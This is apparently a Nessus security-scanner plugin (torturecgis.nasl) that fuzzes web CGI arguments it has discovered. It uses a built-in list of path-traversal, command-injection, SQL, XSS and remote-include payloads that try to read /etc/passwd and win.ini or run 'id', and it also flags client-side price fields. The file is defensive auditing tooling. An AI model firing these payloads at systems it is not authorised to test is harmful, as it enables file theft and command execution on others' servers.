#
# TORTURECGIS
#
#
# Written by Renaud Deraison <deraison@nessus.org>
#
#
# This plugin uses the data collected by webmirror.nasl to try
# to supply bogus values in the remote CGIs. It's not very likely
# to work, but it should simplify the work of a web auditor
#
#
# THIS PLUGIN IS IN ITS ALPHA STAGE.
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10672);
 script_version ("$Revision: 1.44 $");
# script_cve_id("CVE-MAP-NOMATCH");
 script_xref(name: "OWASP", value: "OWASP-AC-001");
 
 name["english"] = "Unknown CGIs arguments torture";
 name["francais"] = "Unknown CGIs arguments torture";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
This script 'tortures' the arguments of the remote CGIs
by attempting to pass common CGI programming errors as
arguments (../../etc/passwd et al.).

*** IN NO WAY THIS SCRIPT IS AS GOOD AS A HUMAN BEING TO
*** DO THIS KIND OF JOB

Risk factor : None to High";



 script_description(english:desc["english"]);
 
 summary["english"] = "Tortures the arguments of the remote CGIs";
 
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK); # Will mess the remote server
 
 
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2001 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "httpver.nasl", "webmirror.nasl");
 script_require_ports("Services/www", 80);
 script_timeout(360); 
 
 script_add_preference(name:"Send POST requests",
                       type:"checkbox", value:"no");

 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


success = "";
pricereport = "";


do_post = script_get_preference("Send POST requests");
if ( do_post && "yes" >< do_post ) do_post = 1;
else do_post = 0;

function test(req, pattern)
{
 local_var str, r;
# display(req, "\n");
 
 str = http_get(item:req, port:port);
 r = http_keepalive_send_recv(port:port, data:str);
# display(r);
 if ( r == NULL ) exit(0);
 if(egrep(pattern:pattern, string:r))
        {
  	success = success + string("\n") + req;
 	r = 0;
 	}
 return(0);
}


function test_post(req, pattern)
{
 local_var str, r, variables;
# display(req, "\n");

 variables = ereg_replace(pattern:"^([^\?])\?(.*)", replace:"\2", string:req);
 req = ereg_replace(pattern:"^([^\?])\?(.*)", replace:"\1", string:req);
 
 str = string("POST ", req, " HTTP/1.1\r\n", 
              "Host: ", get_host_name(), ":", port, "\r\n", 
              "Content-Type: application/x-www-form-urlencoded\r\n", 
              "Content-Length: ", strlen(variables), "\r\n\r\n", variables);

 r = http_keepalive_send_recv(port:port, data:str);
# display(r);
 if ( r == NULL ) exit(0);
 if(egrep(pattern:pattern, string:r))
        {
  	success = success + string("\n") + req;
 	r = 0;
 	}
 return(0);
}


port = get_http_port(default:80);

if(!get_port_state(port))exit(0);


# The syntax is :
# argument						expected result


#------------------------------#
# Remote file listing (20pts)  #
#------------------------------#
flaws[0]="/etc/passwd";					pat[0]="root:.*:0:[01]:";
flaws[1]="../../../../../../../../etc/passwd";			pat[1]=pat[0];
flaws[2]="../../../../../../../../etc/passwd%00";		pat[2]=pat[0];
flaws[3]="../../../../../../../../etc/passwd%00.html";		pat[3]=pat[0];
flaws[4]="../../../../../../../../etc/passwd%00index.html"; 	pat[4]=pat[0];
flaws[5]="%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd";
								pat[5]=pat[0];
 # (this one is ../../../etc/passwd uuencoded - at least one cgi was vulnerable to this)		
flaws[6]="Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAo=";		pat[6]=pat[0];
flaws[7]="%60/etc/passwd%60";					pat[7]=pat[0];

flaws[8]=string("..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini");	pat[8]="\[windows\]";
flaws[9]=string("..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini");	pat[9]="\[fonts\]";
flaws[10]="../../../../../../../../windows/win.ini";			pat[10]="\[windows\]";
flaws[11]="../../../../../../../../winnt/win.ini";			pat[11]="\[fonts\]";



#----------------------------#
# Directory listing (10pts ) #
#----------------------------#
flaws[12]="/etc";						pat[12]="resolv\.conf";
flaws[13]="../../../../../../../../etc";			pat[13]="resolv\.conf";
flaws[14]="..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc";	pat[14]="resolv\.conf";
flaws[15]="%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc";
								pat[15]="resolv\.conf";
								
flaws[16]="../../../../../../../winnt";				pat[16]="win\.ini";
flaws[17]="../../../../../../../windows";			pat[17]="win\.ini";
flaws[18]=string("..\\..\\..\\..\\..\\..\\..\\windows");	pat[18]="win\.ini";
flaws[19]=string("..\\..\\..\\..\\..\\..\\..\\winnt");		pat[19]="win\.ini";
					

#------------------------------#
# Arbitrary commands (100 pts) #
#------------------------------#
flaws[20]="%0Acat%20/etc/passwd";				pat[20]=pat[0];
flaws[21]="|cat%20/etc/passwd|";				pat[21]=pat[0];
flaws[22]="x%0Acat%20/etc/passwd";				pat[22]=pat[0];
flaws[23]="%3Bid";						pat[23]="uid=[0-9]";
flaws[24]="|/bin/id";						pat[24]=pat[23];
flaws[25]="|/usr/bin/id";					pat[25]=pat[23];
flaws[26]="|id|";						pat[26]=pat[23];
flaws[27]="VALUE;/bin/id";					pat[27]=pat[23];
flaws[28]="VALUE;/usr/bin/id";					pat[28]=pat[23];
flaws[29]="VALUE%0Acat%20/etc/passwd";				pat[29]=pat[23];
flaws[30]="VALUE%20|%20dir";					pat[30]="<DIR>";


#
# SQL stuff
# 
flaws[31]="whatever)";						pat[31]="PL/SQL";
flaws[32]="'";							pat[32]="MySQL query";


# 
# XSS (0pt)
# 
flaws[33]="<script>alert('foo');</script>";			pat[33]="<script>alert\('foo'\);</script>";
 
#
# Code injection
# 
flaws[34]="http://xxxxxxxxxxxx/";				pat[34]="http://xxxxxxxxxxxx//?[a-z,A-Z,0-9]";
 
 

cgis = get_kb_list(string("www/", port, "/cgis"));
if(isnull(cgis))exit(0);

# As get_kb_list may return an array with duplicated keys, we call
# make_list() to clean it, just in case.
cgis = make_list(cgis);

foreach cgi (cgis)
{
 cgi_name = ereg_replace(string:cgi,
 			 pattern:"(.*) - .*",
			 replace:"\1");
 cgi = cgi - cgi_name;
 cgi = cgi - string(" - ");
 
 
 
 
 num_args = 0;
 while(cgi)
 {
  args[num_args] = ereg_replace(string:cgi,
  				pattern:"([^ ]*).*",
				replace:"\1");
  if(!args[num_args])
  {
   cgi = "";
  }	
 else
  {
  cgi = cgi - args[num_args];
  cgi = cgi - " ";
  }
  
  str = string(args[num_args]);
  if(ereg(pattern:"^\[.*", string:str))
  {
   tmp = string(ereg_replace(pattern:"^\[(.*)\]",
   				 string:str,
				replace:"\1"));					
   vals[num_args - 1] = tmp;
   if(ereg(pattern:"[0-9]*\$[0-9]*", string:tmp))
   {
    pricereport = string(pricereport,
    	args[num_args - 1], " - ", tmp, "\n");
    
   }			
  }
  else {
 	vals[num_args] = 0;
	num_args = num_args + 1;
	}
 }
 
 
 #
 # Some e-commerce sites have the prices of the items used as hidden values.
 # which is a big no-no
 #
 if(strlen(pricereport))
 {
  report = string("The cgi '", cgi_name, "' seems to pass object prices as values for the following\n",
"arguments :\n",
pricereport,
"\n",
"If that proves to be exact, an attacker may use this flaw to buy goods on the remote site at\n",
"the prices he choose.\n",
"Solution : never rely on data passed by the client when writing a CGI\n",
"Risk factor : High\n",
"Note : this alert is very likely to be a false positive");
 security_warning(port:port, data:report);
 }
 
 if(num_args)
 { 
 for(i=0;i<num_args;i=i+1)
 {
  for(j=0;flaws[j];j=j+1)
  {
   req = "";
   for(k=0;k<num_args;k=k+1)
   {
    if(!(k == i))
    {
     if(strlen(vals[k]))
      _def = string(vals[k]);
     else
      _def = string("nessus");
      
     req = string(req, string(args[k]), "=", _def, "&");
    }
   }
   fl = ereg_replace(string:flaws[j], pattern:"VALUE",
		     replace:vals[i]);
   req = string(string(cgi_name), "?", req, string(args[i]), "=") + fl;
   test(req:req, pattern:pat[j]);
   if ( do_post ) test_post(req:req, pattern:pat[j]);
  }
 }
 }
 else
 {
  for(j=0;flaws[j];j=j+1)
  {
   fl = ereg_replace(string:flaws[j], pattern:"VALUE",
		     replace:"nessus");
   req = string(cgi_name, "?") + fl;
   test(req:req,pattern:pat[j]);
   if ( do_post ) test_post(req:req,pattern:pat[j]);
   }
 }
}

if(strlen(success))
{
report = string("The following requests seem to allow the reading of\n",
"sensitive files or XSS. You should manually try them to see if anything bad happens : ", success);
 security_hole(port:port, data:report);
}			 
